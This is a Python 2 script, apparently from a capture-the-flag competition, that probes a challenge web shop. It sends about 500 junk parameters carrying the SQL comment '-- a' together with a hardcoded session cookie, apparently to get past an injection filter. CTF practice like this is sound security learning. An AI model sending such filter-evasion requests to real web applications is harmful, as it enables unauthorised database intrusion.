# MIT License
#
# Copyright (c) 2017 Pietro Ferretti
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import requests

def char_range(c1, c2):
    """Generates the characters from `c1` to `c2`, inclusive."""
    for c in xrange(ord(c1), ord(c2)+1):
        yield chr(c)

url_main = "http://shobot.teaser.insomnihack.ch/"
url_robot1 = "http://shobot.teaser.insomnihack.ch/?page=article&artid=1&addToCart"
url_robot2 = "http://shobot.teaser.insomnihack.ch/?page=article&artid=2&addToCart"
url_robot3 = "http://shobot.teaser.insomnihack.ch/?page=article&artid=3&addToCart"
url_payment = "http://shobot.teaser.insomnihack.ch/?page=cartconfirm"

cookies = dict(PHPSESSID="vq6v4jdosbm9e0js0oik5m4lb0")


def test_request():
    parameters = ""
    cont = 0
    max_len = 500
    for i in char_range('a', 'z'):
        for j in char_range('a', 'z'):
            for k in char_range('a', 'z'):
                if cont > max_len:
                    return parameters
                else:
                    parameters += "&" + i +j + k +'=-- a'
                    cont += 1


par = test_request()
r = requests.get(url_main + '?no=-- d' + par, cookies=cookies)
print r.text

# for i in range(100):
#     print i
#     r = requests.get("http://shobot.teaser.insomnihack.ch/?page=article&artid=" + str(i) + "&addToCart", cookies=cookies)

#print r.text
